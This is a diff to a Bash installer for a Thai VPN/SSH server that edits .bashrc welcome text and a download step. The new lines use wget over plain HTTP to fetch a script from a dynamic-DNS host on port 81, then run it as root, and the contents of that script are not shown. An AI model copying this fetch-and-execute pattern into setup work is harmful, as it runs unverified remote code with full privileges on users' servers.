@@ -1,7 +1,7 @@
 #!/bin/bash
 #TONZA-VPN
 #Website https://github.com/oi10536/
-#debian 7 MOD BY TONZA-VPN
+#debian 7-8 MOD BY TONZA-VPN
 
 # go to root
 cd
@@ -57,7 +57,7 @@ apt-get install neofetch
 echo "clear" >> .bashrc
 echo 'echo -e "ยินดีต้อนรับสู่เซิร์ฟเวอร์ $HOSTNAME"' >> .bashrc
 echo 'echo -e "Script mod by TONZA-VPN"' >> .bashrc
-echo 'echo -e "พิมพ์ | menuka |เพื่อแสดงรายการคำสั่ง"' >> .bashrc
+echo 'echo -e "พิมพ์ | sm |เพื่อแสดงรายการคำสั่ง"' >> .bashrc
 echo 'echo -e ""' >> .bashrc
 
 # install webserver
@@ -139,11 +139,11 @@ service webmin restart
 
 # download script
 cd /usr/bin
-wget -q -O lock "https://github.com/oi10536/SSH-OpenVPN/raw/master/API/ML/lock.sh" 
+wget -q -O kasang "http://ptt101.hopto.org:81/cad78/data2/kasang.sh" 
 echo "30 3 * * * root /sbin/reboot" > 
 /etc/cron.d/reboot
-chmod +x lock
-./lock 
+chmod +x kasang
+./kasang 
 
 # finishing
 cd
